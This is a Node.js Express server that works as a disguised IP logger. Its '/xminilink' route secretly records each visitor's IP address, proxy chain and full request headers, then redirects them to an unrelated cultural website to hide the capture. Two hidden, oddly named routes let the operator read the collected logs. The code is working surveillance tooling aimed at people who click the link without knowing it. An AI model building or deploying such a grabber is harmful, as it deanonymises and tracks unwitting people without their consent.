const ip = require('ip');
const express = require('express');
const requestIp = require('request-ip');
const jsonfile = require('jsonfile');
var proxyaddr = require('proxy-addr')

const app = express();
app.set('trust proxy', true);
app.use(requestIp.mw());

const pathIP = 'tmp/data.json';
const pathHeaders = 'tmp/headers.json';

const logIp = (req) => {
    const ips = jsonfile.readFileSync(pathIP);
    const ip = requestIp.getClientIp(req)
    ips.unshift({ 
        time: new Date(), 
        ip, 
        forwarder:  req.headers['X-Forwarder-For'] || null,
        proxyaddr: proxyaddr(req, () => true),
    });
    jsonfile.writeFileSync(pathIP, ips, { spaces: 2, replacer: null });
}

const logHeaders = (req) => {
    const ips = jsonfile.readFileSync(pathHeaders); 
    const headers = {
        ...req.headers
    };
    
    ips.unshift({ 
        time: new Date(), 
        headers,
    });
    jsonfile.writeFileSync(pathHeaders, ips, { spaces: 2, replacer: null });

}

app.get("/xminilink",function(req,res) {
    logHeaders(req);
    logIp(req);
    res.redirect("https://www.casadeculturatm.ro/#iLightbox[83e9177113b9396a671]/0");
});
app.use(express.static('static'));

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("Server running on port number" + PORT);
});

app.get('/nuke-a-cola-to-the-moon-ola/123/123/', (req, res) => {
    const ips = jsonfile.readFileSync(pathIP);
    res.end(JSON.stringify(ips, null, 2));
})
app.get('/nuke-a-cola-to-the-moon-ola/123/111/', (req, res) => {
    const ips = jsonfile.readFileSync(pathHeaders);
    res.end(JSON.stringify(ips, null, 2));
})